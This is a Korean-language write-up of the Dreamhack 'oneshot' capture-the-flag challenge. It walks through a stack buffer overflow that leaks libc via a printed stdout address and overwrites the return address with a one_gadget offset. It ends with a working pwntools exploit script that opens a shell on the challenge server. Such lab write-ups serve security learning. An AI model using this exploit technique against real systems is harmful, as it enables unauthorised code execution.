oneshot 라이트업
===========


## 보호 기법 확인

<img width="1030" height="190" alt="image" src="https://github.com/user-attachments/assets/41a99385-5565-421c-826a-1e18271e4745" />


## 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

* libc에 존재하는 stdout의 주소를 알려주기 때문에 libc base 를 구할 수 있을 것이다.
* read 함수는 **46바이트** 만을 읽어올 수 있으며, 버퍼 안에 원하는 값을 작성하는 것 또한 불가능하다.


<img width="822" height="372" alt="image" src="https://github.com/user-attachments/assets/527dc1d3-abf5-4049-b798-7008a78ecce8" />

46바이트가 몇 바이트의 버퍼 오버플로우를 일으키는지 확인해보면, msg = [rbp-0x20]이기 때문에 버퍼 뒤로 46 - 0x20 = 14 바이트를 덮을 수 있다.    
즉 **sfp의 8바이트와 하위 6바이트만을 덮을 수 있다.**

ret의 6바이트밖에 덮을 수 없고, 다른 영역에 작성하기도 어려워 rop을 이용하는 것은 어렵다.  
따라서 one_gadget을 이용해야 한다.


## 익스플로잇

### libc base 계산

<img width="997" height="136" alt="image" src="https://github.com/user-attachments/assets/5a21f990-2155-483a-a32b-879130171b7a" />

<img width="887" height="137" alt="image" src="https://github.com/user-attachments/assets/bb34293b-da2d-4df6-9b90-de4c34b32595" />

stdout이 가리키는 값은 libc의 _IO_2_1_stdout_ 심볼임을 알 수 있다.   

### one_gadget

<img width="1143" height="383" alt="image" src="https://github.com/user-attachments/assets/671d2bae-7fc4-40ac-b01e-3670aec3f324" />

libc에 존재하는 one_gadget들을 확인한다.

여기서 사용할 one_gadget들은 `og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]`


## 익스플로잇 코드 


```python
from pwn import *

p = remote("host8.dreamhack.games", 22056)
e = ELF("./oneshot")
libc = ELF("libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)

libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
og = og[0] + libc_base

print(hex(libc_base))

payload = b"\x00" * 0x20
payload += b"A" * 8
payload += p64(og)[:8]

p.sendafter(b"MSG: ", payload)
p.recvline()

p.interactive()
```




<img width="1175" height="469" alt="image" src="https://github.com/user-attachments/assets/cb40f952-044f-4ec0-9017-c0b8d5775c26" />
